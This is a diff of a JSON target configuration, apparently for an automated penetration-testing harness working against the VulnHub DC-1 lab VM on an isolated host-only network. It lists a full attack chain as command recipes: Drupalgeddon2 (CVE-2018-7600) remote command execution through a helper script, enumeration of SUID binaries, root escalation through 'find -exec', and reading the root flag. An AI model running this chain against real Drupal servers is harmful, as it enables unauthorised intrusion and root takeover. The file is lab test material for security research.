@@ -1,17 +1,27 @@
 {
-  "name": "VulnHub-DC-1",
-  "kind": "boot2root-vm",
-  "target": "http://dc1.lab",
-  "abstract_family": "rce_privesc",
-  "isolation_note": "VulnHub boxes are full VMs. Run on an isolated host-only / internal virtual network (VirtualBox host-only or an air-gapped vSwitch), take a snapshot before the run, and keep a kill switch. Confirm the target IP is private before authorizing.",
-  "eta_fill": {
-    "login": "/user/login",
-    "user": "admin",
-    "password": "admin",
-    "wordlist": "/usr/share/wordlists/dirb/common.txt",
-    "webshell": "/shell.php",
-    "file": "/root/thefinalflag.txt"
+  "name": "VulnHub-DC-1-fullchain",
+  "kind": "full_vm",
+  "target": "http://192.168.52.130",
+  "abstract_family": "web_rce_then_suid_privesc",
+  "vm": {"vmx": "E:\\VMwareVulnHub\\DC-1\\DC-1.vmx", "ip": "192.168.52.130", "snapshot": "clean"},
+  "phases": ["web", "foothold", "local"],
+  "foothold": "webshell",
+  "privesc_vector": "suid-find",
+  "local_exec": {"transport": "webshell", "note": "Drupalgeddon2 2-step RCE via stage2/payloads/drupalgeddon2.sh <url> <cmd>; the executor strips the host HTTP proxy."},
+  "goal": {"flag_path": "/root/thefinalflag.txt", "signal": "euid0-root (SUID find)"},
+  "isolation_note": "VulnHub DC-1 VM on isolated VMnet2 (192.168.52.130), host-only, no internet egress. Owned disposable lab; vm_reset reverts to 'clean'. Drupalgeddon2 RCE is stateless (no persistent write) and SUID-find privesc reads only -> effectively non-mutating, but reset is available.",
+  "eta_fill": {"ip": "192.168.52.130", "file": "/root/thefinalflag.txt"},
+  "eta_recipes": {
+    "http_fingerprint": "curl -s -i \"http://192.168.52.130/\"",
+    "content_retrieval": "curl -s \"http://192.168.52.130/CHANGELOG.txt\"",
+    "web_path_enumeration": "curl -s -i \"http://192.168.52.130/CHANGELOG.txt\"",
+    "vulnerability_check": "curl -s -i \"http://192.168.52.130/CHANGELOG.txt\"",
+    "exploit_attempt": "bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 \"id\"",
+    "command_execution": "bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 \"id\"",
+    "post_exploitation": "bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 \"sudo -l 2>/dev/null; find / -perm -4000 -type f -exec ls -l {} \\;\"",
+    "privilege_escalation": "bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 \"find /etc/passwd -exec id \\;\"",
+    "sensitive_file_read": "bash stage2/payloads/drupalgeddon2.sh http://192.168.52.130 \"find /etc/passwd -exec cat /root/thefinalflag.txt \\;\""
   },
-  "recommended_first": false,
-  "rationale": "Drupalgeddon2 RCE -> SUID find privesc. A web-entry VulnHub box that matches the abstraction well, but it is a full VM with a non-web privesc step (SUID) and an out-of-abstraction offline-crack branch. Use only AFTER the DVWA closed loop works end-to-end (Phase 3)."
+  "recommended_first": true,
+  "rationale": "DC-1 full chain (VALIDATED LIVE 2026-06-21): Drupal 7.24 Drupalgeddon2 (CVE-2018-7600, canonical 2-step user/password->file/ajax via the helper) -> www-data (id) -> SUID find enumeration -> privesc `find /etc/passwd -exec id ;` returns euid=0(root) -> root. Goal = reached_root (euid=0). Webshell transport (curl, executor strips the Clash proxy). Cleanest of the 4; the proven template."
 }
